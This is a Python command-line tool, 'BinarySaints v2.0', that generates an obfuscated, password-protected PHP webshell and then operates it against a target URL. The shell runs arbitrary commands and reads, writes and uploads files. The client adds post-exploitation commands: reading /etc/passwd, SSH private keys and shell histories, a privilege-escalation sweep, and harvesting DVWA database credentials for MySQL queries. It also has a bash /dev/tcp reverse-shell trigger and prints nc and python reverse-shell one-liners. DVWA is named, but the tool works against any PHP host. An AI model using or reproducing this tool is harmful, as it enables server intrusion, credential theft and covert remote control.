#!/usr/bin/env python3
"""
BinarySaints v2.0 - advanced one-command PHP webshell CLI.
PHP 5.3 / 7.x / 8.x compatible. Python 3 stdlib only.

Usage:
    binarysaints generate <password> <outfile.php>
    binarysaints <url> <password>
"""

import sys, os, re, base64, urllib.request, urllib.parse, urllib.error, time

BANNER = r"""
 ____  _                          _       _       _
| __ )(_)_ __   __ _ _ __ _   _  / \   __| |_   _(_)_ __
|  _ \| | '_ \ / _` | '__| | | |/ _ \ / _` | | | | | '_ \
| |_) | | | | | (_| | |  | |_| / ___ \ (_| | |_| | | | | |
|____/|_|_| |_|\__,_|_|   \__, /_/   \_\__,_|\__,_|_|_| |_|
                          |___/   v2.0  (PHP5-safe, stdlib-only)
"""

# --- payload: base64-in / base64-out command channel ---
# Requires only: base64_decode, base64_encode, eval-or-exec family.
# Command arrives base64-encoded in 'c'; output is base64-encoded before echo.
TEMPLATE = r"""<?php
$PASS='%(pass)s';
$p=isset($_GET['p'])?$_GET['p']:(isset($_POST['p'])?$_POST['p']:'');
if($p!==$PASS){header('HTTP/1.0 404 Not Found');exit;}
function _bs_out($s){echo base64_encode($s);exit;}
$c=isset($_GET['c'])?$_GET['c']:'';
if($c!==''){
 $c=base64_decode($c);
 if(function_exists('system')){ob_start();system($c);_bs_out(ob_get_clean());}
 elseif(function_exists('passthru')){ob_start();passthru($c);_bs_out(ob_get_clean());}
 elseif(function_exists('shell_exec')){_bs_out((string)shell_exec($c));}
 elseif(function_exists('exec')){exec($c,$o);_bs_out(implode("\n",$o));}
 elseif(function_exists('popen')){$h=popen($c,'r');$r='';while(!feof($h))$r.=fread($h,4096);pclose($h);_bs_out($r);}
 else _bs_out("no_exec");
}
if(!empty($_GET['r'])){_bs_out(is_readable($_GET['r'])?file_get_contents($_GET['r']):"not_readable");}
if(!empty($_POST['w'])&&isset($_POST['d'])){_bs_out(file_put_contents($_POST['w'],base64_decode($_POST['d']))!==false?"ok":"fail");}
if(!empty($_FILES['f'])){$dir=!empty($_POST['dir'])?$_POST['dir']:'/tmp';$dst=rtrim($dir,'/').'/'.basename($_FILES['f']['name']);_bs_out(move_uploaded_file($_FILES['f']['tmp_name'],$dst)?"uploaded $dst":"fail");}
if(isset($_GET['ls'])){$d=$_GET['ls']===''?'.':$_GET['ls'];$h=@opendir($d);if(!$h){_bs_out("no_dir");}$r='';while(($f=readdir($h))!==false){$r.=$f."\n";}closedir($h);_bs_out($r);}
echo "ok";
"""

UA = 'BinarySaints/2.0'


# ---------- payload generation ----------

def gen(pw, out):
    with open(out, 'w') as f:
        f.write(TEMPLATE % {'pass': pw})
    sz = os.path.getsize(out)
    print("[+] Payload  : %s (%d bytes)" % (out, sz))
    print("[+] Password : %s" % pw)
    print("[+] PHP      : 5.3+ compatible")
    print("[+] Channel  : base64 request/response obfuscation")
    print("[*] Upload, then:")
    print("    binarysaints <url> <password>")


# ---------- HTTP transport ----------

def _fetch(url):
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return "[HTTP %s] %s" % (e.code, e.reason)
    except Exception as e:
        return "[ERR] %s" % e


def _post(url, data):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, headers={'User-Agent': UA})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.read().decode('utf-8', 'replace')
    except Exception as e:
        return "[ERR] %s" % e


def _qs(url, pw, **params):
    params['p'] = pw
    sep = '&' if '?' in url else '?'
    return url + sep + urllib.parse.urlencode(params)


def _unb64(s):
    """Decode base64 server output; fall back to raw on error."""
    s = s.strip()
    try:
        return base64.b64decode(s).decode('utf-8', 'replace')
    except Exception:
        return s


def cmd(url, pw, c):
    b64 = base64.b64encode(c.encode()).decode()
    return _unb64(_fetch(_qs(url, pw, c=b64)))


def read(url, pw, path):
    return _unb64(_fetch(_qs(url, pw, r=path)))


def lsdir(url, pw, d):
    return _unb64(_fetch(_qs(url, pw, ls=d)))


def write_b64(url, pw, remote, b64):
    return _unb64(_post(url, {'p': pw, 'w': remote, 'd': b64}))


# ---------- remote shell helpers ----------

def sh(url, pw, c):
    """Run a command, return stdout (already base64-decoded)."""
    return cmd(url, pw, c)


def find_dvwa_conf(url, pw):
    """Best-effort locate of DVWA config.inc.php."""
    for p in ('/var/www/dvwa/config/config.inc.php',
              '/var/www/html/dvwa/config/config.inc.php',
              '/srv/www/dvwa/config/config.inc.php'):
        out = read(url, pw, p)
        if 'db_user' in out or 'DVWA' in out:
            return p, out
    out = sh(url, pw, "find / -name 'config.inc.php' -path '*dvwa*' 2>/dev/null | head -n1")
    if out.strip().startswith('/'):
        return out.strip(), read(url, pw, out.strip())
    return None, None


# ---------- interactive commands ----------

HELP = """
Core
  :help                    this help
  :q, :quit, exit          exit
  <cmd>                    run shell command
  :sysinfo                 id, uname, pwd, php -v, ls
  :phpinfo                 disable_functions / open_basedir / allow_url_fopen
  :cd <dir>                change tracked remote cwd
  :ls [dir]                list directory

Files
  :read <path>             read remote file
  :get <remote> <local>    download remote file
  :put <local> <remote>    upload local file
  :find <dir> <name>       find files by name (uses find)
  :grep <pattern> <path>   grep recursively (uses grep -rni)

Recon
  :privesc                 one-shot privesc sweep
  :suid                    SUID / SGID binaries
  :passwd                  read /etc/passwd (multi-method)
  :procs                   ps aux || ps -ef
  :netstat                 netstat || ss
  :cron                    cron jobs
  :ssh                     SSH keys / known_hosts / authorized_keys
  :history                 shell histories of common users
  :env                     environment (PATH, HOME, etc.)

Exploit
  :mysql "<query>"         run SQL via mysql client (auto DB creds)
  :rev <lhost> <lport>     trigger bash /dev/tcp reverse shell
  :listen <lhost> <lport>  print reverse-shell one-liners
"""


def _section(title):
    return "\n=== %s ===\n" % title


def do_privesc(url, pw):
    sections = [
        ('id / whoami',           'id; whoami'),
        ('sudo',                  'sudo -l 2>/dev/null || echo "no sudo output"'),
        ('SUID',                  'find / -perm -4000 -type f 2>/dev/null'),
        ('SGID',                  'find / -perm -2000 -type f 2>/dev/null'),
        ('writable /etc',         'ls -la /etc/passwd /etc/shadow 2>/dev/null'),
        ('cron',                  'cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null'),
        ('SSH keys',              'ls -la /root/.ssh /home/*/.ssh 2>/dev/null'),
        ('shell histories',       'cat /root/.bash_history /home/*/.bash_history 2>/dev/null | head -100'),
        ('world-writable /tmp',   'ls -la /tmp 2>/dev/null | head -20'),
        ('passwd',                'cat /etc/passwd 2>/dev/null | head -5'),
        ('DVWA config',           "cat /var/www/dvwa/config/config.inc.php 2>/dev/null || "
                                  "cat /var/www/html/dvwa/config/config.inc.php 2>/dev/null || true"),
    ]
    for label, c in sections:
        print(_section(label))
        out = sh(url, pw, c)
        print(out if out.strip() else "(empty)")


def do_sysinfo(url, pw, cwd):
    for c in ('id', 'uname -a', 'pwd', 'php -v 2>/dev/null || true', 'ls -la ' + cwd):
        print("$ %s\n%s" % (c, sh(url, pw, c)))


def do_mysql(url, pw, query):
    path, conf = find_dvwa_conf(url, pw)
    if not conf:
        print("[!] DVWA config not found"); return
    u = re.search(r"db_user'\s*\]\s*=\s*'([^']+)'", conf)
    p = re.search(r"db_password'\s*\]\s*=\s*'([^']+)'", conf)
    db = re.search(r"db_database'\s*\]\s*=\s*'([^']+)'", conf)
    if not (u and p):
        print("[!] Could not parse DB creds"); return
    dbn = db.group(1) if db else 'dvwa'
    full = "mysql -u%s -p'%s' %s -e \"%s\" 2>/dev/null" % (u.group(1), p.group(1), dbn, query)
    out = sh(url, pw, full)
    if not out.strip():
        print("[!] mysql client may be missing or query failed")
    else:
        print(out)


def run(url, pw):
    print(BANNER)
    probe = 'BS_' + str(int(time.time()))
    if probe not in cmd(url, pw, 'echo ' + probe):
        print("[!] Handshake failed.")
        print("[!] Server response: %s" % _fetch(_qs(url, pw, c=base64.b64encode(b'echo BS').decode()))[:400])
        print("[!] Check URL / password / upload / PHP version.")
        sys.exit(1)

    print("[+] Target  : %s" % url)
    print("[+] Status  : connected  (base64 channel)")
    print("[+] Type    : :help")
    print()

    cwd = '/var/www'
    while True:
        try:
            line = input("bs[%s]> " % cwd).strip()
        except (EOFError, KeyboardInterrupt):
            print(); break
        if not line: continue
        if line in (':q', ':quit', 'exit'): break

        if line == ':help':
            print(HELP); continue

        if line == ':sysinfo':
            do_sysinfo(url, pw, cwd); continue

        if line == ':phpinfo':
            q = ('php -i 2>/dev/null | grep -Ei '
                 '"disable_functions|open_basedir|allow_url_fopen|safe_mode" '
                 '|| echo "php -i failed"')
            print(sh(url, pw, q)); continue

        if line.startswith(':cd '):
            cwd = line[4:].strip(); print("[*] cwd = %s" % cwd); continue

        if line.startswith(':ls'):
            d = line[3:].strip() or cwd
            print(lsdir(url, pw, d)); continue

        if line.startswith(':read '):
            print(read(url, pw, line[6:].strip())); continue

        if line.startswith(':get '):
            parts = line.split()
            if len(parts) != 3: print("usage: :get <remote> <local>"); continue
            data = read(url, pw, parts[1])
            with open(parts[2], 'w') as f: f.write(data)
            print("[+] saved %d bytes -> %s" % (len(data), parts[2])); continue

        if line.startswith(':put '):
            parts = line.split()
            if len(parts) != 3: print("usage: :put <local> <remote>"); continue
            try: data = open(parts[1], 'rb').read()
            except Exception as e: print("[ERR] %s" % e); continue
            print(write_b64(url, pw, parts[2], base64.b64encode(data).decode())); continue

        if line.startswith(':find '):
            parts = line.split()
            if len(parts) != 3: print("usage: :find <dir> <name>"); continue
            print(sh(url, pw, "find %s -name '%s' 2>/dev/null | head -50" % (parts[1], parts[2]))); continue

        if line.startswith(':grep '):
            rest = line[6:]
            if ' ' not in rest: print("usage: :grep <pattern> <path>"); continue
            pat, path = rest.split(' ', 1)
            print(sh(url, pw, "grep -rni '%s' %s 2>/dev/null | head -50" % (pat, path))); continue

        if line == ':privesc':
            do_privesc(url, pw); continue

        if line == ':suid':
            print(sh(url, pw, "find / -perm -4000 -type f 2>/dev/null")); continue

        if line == ':passwd':
            for m in ('cat /etc/passwd', 'head /etc/passwd', 'grep . /etc/passwd'):
                o = sh(url, pw, m)
                if 'root:' in o: print(o); break
            continue

        if line == ':procs':
            print(sh(url, pw, 'ps aux 2>/dev/null || ps -ef 2>/dev/null')); continue

        if line == ':netstat':
            print(sh(url, pw, 'netstat -tulnp 2>/dev/null || ss -tulnp 2>/dev/null')); continue

        if line == ':cron':
            print(sh(url, pw, 'cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null')); continue

        if line == ':ssh':
            print(sh(url, pw, 'ls -la /root/.ssh /home/*/.ssh 2>/dev/null; '
                              'cat /root/.ssh/id_rsa /home/*/.ssh/id_rsa 2>/dev/null | head -80'))
            continue

        if line == ':history':
            print(sh(url, pw, 'cat /root/.bash_history /home/*/.bash_history 2>/dev/null | head -120'))
            continue

        if line == ':env':
            print(sh(url, pw, 'env 2>/dev/null || set')); continue

        if line.startswith(':mysql '):
            q = line[7:].strip()
            if q.startswith('"') and q.endswith('"'):
                q = q[1:-1]
            do_mysql(url, pw, q); continue

        if line.startswith(':rev '):
            parts = line.split()
            if len(parts) != 3: print("usage: :rev <lhost> <lport>"); continue
            h, p = parts[1], parts[2]
            payload = "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (h, p)
            print(sh(url, pw, payload))
            print("[*] Start listener: nc -lvnp %s" % p)
            continue

        if line.startswith(':listen '):
            parts = line.split()
            if len(parts) != 3: print("usage: :listen <lhost> <lport>"); continue
            h, p = parts[1], parts[2]
            print("bash: bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (h, p))
            print("nc  : nc -e /bin/sh %s %s" % (h, p))
            print("py3 : python3 -c 'import socket,subprocess,os;"
                  "s=socket.socket();s.connect((\"%s\",%s));"
                  "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
                  "subprocess.call([\"/bin/sh\",\"-i\"])'" % (h, p))
            print("listener: nc -lvnp %s" % p)
            continue

        # default: raw command
        print(sh(url, pw, line))


# ---------- entry ----------

def main():
    a = sys.argv
    if len(a) < 2:
        print(BANNER)
        print("usage:")
        print("  binarysaints generate <password> <outfile.php>")
        print("  binarysaints <url> <password>")
        sys.exit(1)

    if a[1] == 'generate':
        if len(a) != 4:
            print("usage: binarysaints generate <password> <outfile.php>"); sys.exit(1)
        gen(a[2], a[3]); return

    if len(a) == 3:
        run(a[1], a[2]); return

    print("[!] bad args"); sys.exit(1)


if __name__ == '__main__':
    main()
